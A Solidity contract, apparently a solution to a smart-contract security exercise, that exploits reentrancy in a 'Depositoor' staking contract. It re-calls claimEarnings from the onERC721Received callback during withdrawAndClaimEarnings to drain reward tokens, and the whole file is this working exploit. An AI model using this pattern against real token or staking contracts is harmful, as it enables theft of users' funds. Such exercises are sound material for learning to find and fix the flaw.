// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../RewardToken.sol";

contract RewardTokenAttacker is IERC721Receiver {
    Depositoor depositor;
    NftToStake nft;
    RewardToken token;

    function setup(Depositoor _depositor, NftToStake _nft, RewardToken _token) public {
        depositor = _depositor;
        nft = _nft;
        token = _token;
        nft.safeTransferFrom(address(this), address(depositor), 42);
    }

    function attack() public {
        depositor.withdrawAndClaimEarnings(42);
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        if (token.balanceOf(address(depositor)) > 0) {
            depositor.claimEarnings(42);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}